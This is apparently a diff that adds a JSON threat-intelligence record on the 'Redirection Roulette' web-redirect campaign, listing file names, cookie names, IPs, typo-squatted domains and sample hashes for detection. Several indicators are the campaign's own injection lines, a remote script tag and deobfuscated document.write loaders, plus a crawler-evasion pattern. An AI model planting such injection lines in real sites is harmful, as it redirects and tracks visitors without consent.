@@ -1,0 +1,326 @@
+{
+  "malware_family": "Redirection Roulette",
+  "threat_actor": "Unknown",
+  "platforms": [
+    "web",
+    "linux"
+  ],
+  "summary": "An unknown threat actor compromises tens of thousands of websites, primarily in East Asia, using stolen FTP credentials. They inject malicious JavaScript to conditionally redirect visitors to adult or gambling websites, a campaign the report calls 'Redirection Roulette'. The actor uses typo-squatted domains and geofencing to evade detection.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "systemd-private-56d86f7d8382402517f3b5-jP37av",
+      "context": "Persistence file on compromised Pagoda servers.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "systemd-private-56d86f7d8382402517f3b51625789161d2cb-chronyd.service-jP37av",
+      "context": "Persistence file on compromised Pagoda servers.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "<script type=\"text/javascript\" src=\"https://tpc.googlesyndication.wiki/sodar/sodar2.js\"></script>",
+      "context": "Malicious script tag injected into compromised web pages.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "bot|googlebot|crawler|spider|robot|crawling|Bytespider|Googlebot|Baiduspider|MSN Bot/Bingbot|Yandex Bot|Soso Spider|Sosospider|Sogou Spider|360Spider|Yahoo! Slurp China|Yahoo!|YoudaoBot|YodaoBot|Sogou News Spider|msnbot|msnbot-media|bingbot|YisouSpider|ia_archiver|EasouSpider|JikeSpider|EtaoSpider|SemrushBot",
+      "context": "Regex-like string in script to identify and ignore web crawlers.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "qwertvy",
+      "context": "Cookie name set on user's machine to track redirection status.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "bdstatics",
+      "context": "Cookie name set on user's machine to track redirection status.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "waf_sc",
+      "context": "Cookie name set by scripts on compromised Pagoda servers.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "5889647726",
+      "context": "Value set for the 'waf_sc' cookie.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "document.write(unescape(\"%3Cscript src='https://www.metamarket.quest/market.js'%3E%3C/script%3E\"));",
+      "context": "Deobfuscated JS to inject script on Pagoda-related infections.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "document.write(unescape(\"%3Cscript src='https://a.msstatic.net/main3/common/assets/template/head/ad.tmpl_a9b7.js'%3E%3C/script%3E\"));",
+      "context": "Deobfuscated JS to inject script on Pagoda-related infections.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "isSpider",
+      "context": "JavaScript function name to check for web crawlers.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "172.81.104.64",
+      "context": "Threat actor IP address used for FTP connections to web servers.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "193.109.120.45",
+      "context": "Exposed historical origin IP for minjs.us.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "159.69.123.158",
+      "context": "Exposed historical origin IP for metamarket.quest.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "tpc.googlesyndication.wiki",
+      "context": "Domain hosting malicious sodar2.js script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/sodar/sodar2.js",
+      "context": "Path for malicious script on tpc.googlesyndication.wiki.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "beacon-v2.helpscout.help",
+      "context": "Domain hosting malicious vendor.06c7227b.js script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cdn.jsdelivr.autos",
+      "context": "Domain hosting malicious jquery.min.js script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "www.metamarket.quest",
+      "context": "Domain hosting malicious market.js script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "minjs.us",
+      "context": "Domain hosting malicious min.js script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cdn-go.net",
+      "context": "Domain hosting malicious script, linked to Pagoda compromises.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "a.msstatic.net",
+      "context": "Domain hosting malicious script, linked to Pagoda compromises.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "s3a.pstatp.org",
+      "context": "Intermediate redirection server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "stat.51sdk.org",
+      "context": "Intermediate redirection server, uses random 16-byte path.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "tpc.cdn-linkedin.info",
+      "context": "Intermediate redirection server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "widget-v4.tidiochat.net",
+      "context": "Intermediate redirection server, uses wildcard paths.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/top/record/addRecord",
+      "context": "API endpoint for exfiltrating browser fingerprint data in older scripts.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "alibb*.xyz",
+      "context": "Pattern for destination websites.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "alivod1.com",
+      "context": "Destination website for redirection.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "22332299.com",
+      "context": "Destination website for redirection.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "qs70qw11az.com",
+      "context": "Dynamically generated destination domain for redirection.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "3kdv58xk.ibtoc3t7.com",
+      "context": "Possibly related domain identified by pivoting on 'waf_sc' cookie.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "08d6092832ab0631cb45415707fe6e262a205d1809a064ed9aa577647a39ba8e",
+      "description": "sodar2.js malicious script"
+    },
+    {
+      "sha256": "50bf3385e888eee5e31a92d71c9a194b3bdfb62760b9cc069b962ef9d3b5646f",
+      "description": "vendor.06c7227b.js malicious script"
+    },
+    {
+      "sha256": "4770fdd231dccd6775a561fbf9c9dc16c0009aaea934107f5d7e9a79e10295d7",
+      "description": "market.js malicious script"
+    },
+    {
+      "sha256": "30ec43c09bc09a4224001acb4af67126d5f2c58a2120c3e9f606c719ab6c826b",
+      "description": "jquery.min.js malicious script"
+    },
+    {
+      "sha256": "76acbfd3312024f2c3046ead1c6da8d1bb832cb9e71fe74a4977f9e30067cfb3",
+      "description": "ad.tmpl_a9b7.js malicious script"
+    },
+    {
+      "sha256": "abdf025595c1e544d7a33432d4a8b2ed0a0170bc4d1657312396e14d277dc2d1",
+      "description": "Modified nginx binary from compromised Pagoda server"
+    },
+    {
+      "sha256": "a39970152a2d753c4fb449b15617820c72d02c3489f99155131f68376edc714e",
+      "description": "Persistence file systemd-private-56d86f7d8382402517f3b5-jP37av"
+    }
+  ],
+  "file_types": [
+    "script",
+    "elf"
+  ]
+}
